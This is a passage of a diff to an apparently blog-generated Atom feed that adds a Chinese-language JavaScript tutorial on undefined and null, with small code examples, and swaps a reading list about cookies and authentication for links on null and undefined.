+<h3 id="返回undefined的情况">返回undefined的情况</h3>
+<ul>
+<li>访问未修改的全局变量 <code>undefined</code>。</li>
+<li>由于没有定义 <code>return</code> 表达式的函数隐式返回。</li>
+<li><code>return</code> 表达式没有显式的返回任何内容。</li>
+<li>访问不存在的属性。</li>
+<li>函数参数没有被显式的传递值。</li>
+<li>任何被设置为 <code>undefined</code> 值的变量。</li>
+</ul>
+<pre><code class="language-js">// 变量声明了，但没有赋值
+var i;
+i // undefined
+
+// 调用函数时，应该提供的参数没有提供，该参数等于 undefined
+function f(x) {
+  return x;
+}
+f() // undefined
+
+// 对象没有赋值的属性
+var  o = new Object();
+o.p // undefined
+
+// 函数没有返回值时，默认返回 undefined
+function f() {}
+f() // undefined
+</code></pre>
+<h2 id="null">null</h2>
+<p><code>null</code>表示空值，即该处的值现在为空。</p>
+<p>**调用函数时，某个参数未设置任何值，这时就可以传入<code>null</code>，表示该参数为空。**比如，某个函数接受引擎抛出的错误作为参数，如果运行过程中未出错，那么这个参数就会传入<code>null</code>，表示未发生错误。</p>
+<h2 id="区别">区别</h2>
+<blockquote>
+<p>undefined表示“缺少值”，即此处应有一个值，但还没有定义。</p>
+<p>null表示被赋值过的对象，刻意把一个对象赋值为<code>null</code>，故意表示其为空，不应有值。</p>
+</blockquote>
+<blockquote>
+<p>undefined转为数值时为<code>NaN</code></p>
+<p>null转换为数值时值为0</p>
 </blockquote>
 <h2 id="推荐阅读">推荐阅读</h2>
-<p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies">MDN/HTTP/Cookies</a></p>
-<p><a href="https://juejin.cn/post/6898630134530752520">前端鉴权的兄弟们：cookie、session、token、jwt、单点登录</a></p>
-<p><a href="https://juejin.cn/post/6844904034181070861">傻傻分不清之 Cookie、Session、Token、JWT</a></p>
-<p><a href="https://juejin.cn/post/6844903812092674061">深入了解浏览器存储--从cookie到WebStorage、IndexedDB</a></p>
-<p><a href="https://juejin.cn/post/6914109129267740686">面试不再怕：史上最全的cookie知识点详解</a></p>
+<p><a href="http://bonsaiden.github.io/JavaScript-Garden/zh/#core.undefined">JavaScript秘密花园</a></p>
+<p><a href="https://wangdoc.com/javascript/types/null-undefined-boolean.html">阮一峰</a></p>
 ]]></content>
     </entry>
 </feed>
